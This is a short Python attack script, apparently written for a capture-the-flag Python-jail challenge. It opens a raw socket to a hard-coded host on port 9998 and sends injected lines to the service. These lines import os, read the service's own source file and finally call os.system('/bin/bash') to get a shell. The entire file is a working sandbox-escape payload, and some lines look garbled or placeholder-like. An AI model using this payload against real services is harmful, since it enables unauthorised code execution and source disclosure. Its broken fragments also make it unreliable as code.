#   -*- coding:utf-8  -*-
#!usr/bin/evn python

# from scapy.all import *
# from pwn import *
import socket
import time

class remote(object):
    s = None
    def __init__(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.s.connect((host, port))
        except Exception as e:
            print("[!]port %d is close"%port)
            assert 1==3

    def sendline(self, string):
        self.s.send(string+"\n")
        return string

# def remote(host,port):
#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     try:
#         s.connect((host, port))
#     except Exception as e:
#         print("[!]port %d is close"%port)
#         assert 1==3
#     return s

# def sendline()
def attacker(host, port = 9998):
    ph = remote(host, port)
    ph.sendline("ls")
    # time.sleep(1)
    ph.sendline("print(\"file.py\")")
    ph.sendline("df...a\nexp()\nimport os\n")
    # time.sleep(1)
    ph.sendline("fd=open(__file__)")
    ph.sendline('print(list(map(print,fd)))')
    ph.sendline("\.")
    # time.sleep(1)
    ph.sendline("print(getattr(os, \"system\")(\"/bin/bash\"))")

    return True


if __name__ == "__main__":
    attacker("192.168.140.128")
